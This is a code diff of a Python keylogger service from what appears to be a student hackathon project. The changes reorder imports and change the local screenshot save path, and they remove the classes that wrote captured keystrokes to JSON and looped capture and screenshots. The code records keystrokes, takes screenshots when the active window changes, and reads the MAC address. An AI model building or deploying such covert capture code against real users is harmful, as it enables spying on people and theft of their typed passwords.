@@ -1,12 +1,9 @@
-import threading
-import time
 import keyboard
 import os
-import  json
+import time
+from PIL import ImageGrab
 from getmac import get_mac_address
 import win32gui
-from PIL import ImageGrab
-
 
 class KeyloggerService:
     def __init__(self):
@@ -42,7 +39,7 @@ class KeyloggerService:
     def current_screenshot(self):
         if [self.prev_up] != [self.current_app]:
             screen_shot = ImageGrab.grab()
-            path = rF"C:\Users\1\פרוייקט סיום קודקוד\keylogger_picture-{time.strftime('%d-%m-%Y  %H-%M-%S')}.jpg"
+            path = rF"C:\Users\matan\kodkod\programming\Hackathon_KeyLoger_agent\new_projecct\matanya alkobi\output\newfile-{time.strftime('%d-%m-%Y  %H-%M-%S')}.jpg"
             screen_shot.save(path)
             self.prev_up = self.current_app
 
@@ -79,36 +76,3 @@ class KeyloggerService:
 
     def __exit__(self, exc_type, exc_val, exc_tb):
         return 1
-
-class FileWriter:
-    @staticmethod
-    def write_to_file(data:dict):
-        with open(r"C:\Users\1\פרוייקט סיום קודקוד\אוסף הקשות.json" , "w" , encoding="utf-8") as file:
-            json.dump(data , file ,ensure_ascii=False)
-
-
-class KeyLoggerManager:
-
-    def __init__(self):
-        self.instance = KeyloggerService()
-
-    def start(self):
-        self.instance.start()
-
-    def write_to_file(self):
-        FileWriter.write_to_file(self.instance.get_data())
-
-    def main(self):
-        threading.Thread(target=self.start).start()
-        while True:
-            print(self.instance.current_app == self.instance.prev_up)
-            self.instance.current_screenshot()
-            threading.Thread(target=self.write_to_file).start()
-            time.sleep(5)
-print(get_mac_address())
-
-A = KeyLoggerManager()
-A.main()
-
-
-
